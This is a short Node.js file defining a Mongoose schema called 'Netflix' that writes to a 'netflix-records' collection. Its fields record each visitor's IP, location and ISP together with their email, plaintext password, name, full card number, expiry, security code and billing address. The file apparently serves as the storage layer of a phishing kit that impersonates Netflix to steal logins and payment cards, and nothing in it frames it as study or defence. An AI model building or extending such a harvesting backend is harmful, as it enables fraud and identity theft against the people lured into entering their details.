const mongoose = require('mongoose'); 

const Netflix = new mongoose.Schema(

    {
        visitor_id:{type: String, unique: false},
        ip:{type: String, unique: false},
        state:{type: String, unique: false},
        country:{type: String, unique: false},
        isp:{type: String, unique: false},
        email:{type: String, unique: false},
        password:{type: String, unique: false},
        first:{type: String, unique: false},
        last:{type: String, unique: false},
        card:{type: String, unique: false},
        expiry:{type: String, unique: false},
        securityCode:{type: String, unique: false},
        billing:{type: String, unique: false},


    },

    { collection: 'netflix-records'}
)

const model = mongoose.model('netflix-records', Netflix)

module.exports = model; 